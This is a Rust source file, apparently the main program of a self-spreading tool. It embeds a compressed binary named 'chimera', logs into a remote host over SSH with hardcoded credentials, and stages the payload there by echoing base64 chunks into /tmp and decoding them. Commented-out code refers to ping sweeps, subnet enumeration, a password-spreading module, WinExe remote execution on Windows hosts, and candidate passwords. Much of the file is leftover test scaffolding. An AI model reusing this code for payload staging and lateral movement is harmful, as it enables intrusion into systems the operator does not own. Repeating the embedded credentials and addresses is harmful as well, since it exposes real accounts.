// mod enumeration;
mod init;
mod net;
// use enumeration::ping;
use net::{
    ssh::{self, SSHClient},
    winexe::{self, WinexeClient},
};

//use std::future::Future;
use crate::net::communicator::{Credentials, Session};
use crate::net::spread::spreader::Spreader;
use flate2::read::GzDecoder;
use futures::future::join_all;
use futures::{Future, FutureExt};

use std::process::Command;

const CHIMERA: &[u8] = include_bytes!("../bin/chimera64.zlib");

struct MemoryReport;

impl Drop for MemoryReport {
    fn drop(&mut self) {
        // Use an OS-specific command to get memory usage
        // This is an example for Linux using `ps`
        let output = Command::new("ps")
            .arg("-o")
            .arg("rss=")
            .arg("-p")
            .arg(std::process::id().to_string())
            .output()
            .expect("Failed to execute command");

        let memory_usage = String::from_utf8_lossy(&output.stdout);
        println!("Memory Usage at Exit: {} KB", memory_usage.trim());
    }
}

// fn execute_commands<'a, C>(communicator: &'a C, cmds: Vec<&'a str>) -> Vec<impl Future<Output = Result<Option<String>, std::io::Error>> + 'a>
// where
//     C: Communicator + 'a,
// {
//     cmds.into_iter()
//         .map(|cmd| {

//             async move {
//                 communicator.execute_command(
//                     cmd
//                 ).await
//             }
//         })
//         .collect()
// }

#[tokio::main]
async fn main() {
    // const WINEXE_ARCHIVE: &'static [u8] = include_bytes!("../img.tar.gz");
    // let img_path = "/tmp/img";

    // if !std::path::Path::new(img_path).exists() {
    //     let tar_data = GzDecoder::new(WINEXE_ARCHIVE);
    //     let mut archive = Archive::new(tar_data);
    //     if let Err(e) = archive.unpack("/tmp") {
    //         eprintln!("Failed to unpack archive: {}", e);
    //         return;
    //     }
    // }

    // let winexe_client = match WinexeClient::new(Some("/tmp/img".to_string())).await {
    //     Ok(client) => client,
    //     Err(e) => {
    //         eprintln!("Failed to create WinexeClient: {}", e);
    //         return;
    //     }
    // };

    // let hosts = ping::ping_sweep();
    // let mut enumerator = ping::Enumerator::new("10.100.107".to_string());
    // enumerator.ping_sweep().await.unwrap();

    // let spreader = init::Spreader::new("password".to_string());

    // let mut spreader = Spreader::new("password123".to_string());
    // spreader.spread
    // spreader.enumerate_hosts("192.168.60").await;
    // password123
    // spreader.spread().await;
    // for host in enumerator.hosts {
    //     println!("Host: {}", host.ip);
    //  GoblinoMunchers759!
    //     // println!("OS: {:?}", host.os);
    // }

    let creds: Credentials = Credentials {
        username: "cm03".into(),
        password: Some("@11272003Cm!".to_string()),
        key: None,
    };

    let ssh_client = SSHClient::new()
        .ip("10.123.40.102".to_string())
        .connect(&creds)
        .await
        .unwrap();

    // let mut decompresser = GzDecoder::new(CHIMERA);
    // let mut decompressed_data = Vec::new();
    // decompresser
    //     .read_to_end(&mut decompressed_data)
    //     .expect("Failed to decompress data");

    // let base64_str = String::from_utf8(decompressed_data).expect("Unable to parse UTF-8");

    // // Define the chunk size in bytes
    // const CHUNK_SIZE: usize = 125 * 1024; // 100 KB

    // let mut start = 0;
    // let total_length = base64_str.len();

    // while start < total_length {
    //     let end = std::cmp::min(start + CHUNK_SIZE, total_length);
    //     let end = base64_str[..end]
    //         .char_indices()
    //         .last()
    //         .map_or(end, |(idx, _)| idx + 1);

    //     let chunk_str = &base64_str[start..end];
    //     let command = format!("echo \"{}\" >> /tmp/chimera64", chunk_str);

    //     // Assuming ssh_client is an async SSH client and properly initialized
    //     ssh_client.execute_command(&command).await.unwrap();

    //     // Print the progress
    //     println!("Transferred {} / {} bytes", end, total_length);

    //     start = end;
    // }
    println!("DONE CHUNKING");
    // .for_each(|chunk| {
    //     let chunk_str = chunk.iter().collect::<String>();

    //     let command = format!("echo \"{}\" >> /tmp/chimera64", chunk_str);

    //     ssh_client.execute_command(&command).await.unwrap();
    // });

    let command = format!("base64 -d /tmp/chimera64 > /tmp/chimera");
    ssh_client.execute_command(&command).await.unwrap();
    // println!("EXECUTIONG {}", command);

    // let winexe_client = WinexeClient::new()
    //     .container_path("/tmp/img".to_string())
    //     .ip("139.182.180.236".to_string())
    //     .connect(&creds)
    //     .await
    //     .expect("");
    // let ssh_client2 = SSHClient::new()
    //     .ip("139.182.180.113".to_string())
    //     .connect(&creds)
    //     .await
    //     .unwrap();
    // let ssh_client = SSHClient::new()
    //     .ip("139.182.180.113".to_string())
    //     .connect(&creds)
    //     .await
    //     .unwrap();

    // let mut handles = vec![];

    // handles.push(tokio::spawn(async move {
    //     ssh_client2
    //         .execute_command("echo client2 > /tmp/test")
    //         .await;
    //     ssh_client2
    //         .execute_command("echo client2 > /tmp/test")
    //         .await;
    //     ssh_client2
    //         .execute_command("echo client2 > /tmp/test")
    //         .await;
    //     ssh_client2.execute_command("echo Step 2").await;
    //     ssh_client2.execute_command("echo Step 3").await;
    // }));

    // handles.push(tokio::spawn(async move {
    //     ssh_client.execute_command("echo client1 > /tmp/test").await;
    //     ssh_client.execute_command("echo client1 > /tmp/test").await;
    // }));

    // Wait for all spawned tasks to complete
    // join_all(handles).await;

    // ssh_client.unwrap().execute_command("echo Test1 > /tmp/test").await;
    // let ssh_client = SSHClient::new(&creds, "139.182.180.113:22".to_string(), None).await;

    let cmds = vec![
        "echo Test3 > /temp/test\n",
        "echo Test2 > /temp/test\n",
        "echo Test1 > /temp/test\n",
    ];

    // let output = winexe_client.execute_command("powershell.exe ls /temp\n").await.unwrap();
    // let x = winexe_client.execute_command("echo 333\n").await.unwrap();
    // // print output
    // println!("{:?}", output);
    // println!("{:?}", x);
    // let out = winexe_client.execute_command("echo Test1\n").await.unwrap();
    // println!("{:?}", out);
    // winexe_client2.execute_command("echo Test2 > /tmp/test\n").await.unwrap();
    // winexe_client.close().await.unwrap();

    // ssh_client.execute_command("powershell.exe ls\n").await.unwrap();
    // ssh_client.child_process.unwrap().wait().await.unwrap();
    // winexe_client.execute_command("dir\n").await.unwrap();
    // let command1 = winexe_client.execute_command("echo ONEE\n");
    // let command2 = winexe_client.execute_command("dir\n");
    // let command2 = winexe_client.execute_command("dir\n");

    // let (result1, result2) = tokio::join!(command1, command2);

    // winexe_client.close().await;

    // println!("Result 1: {:?}", result1);
    // println!("Result 2: {:?}", result2);
    let _memory_report = MemoryReport;

    // winexe_client.close().await;
}
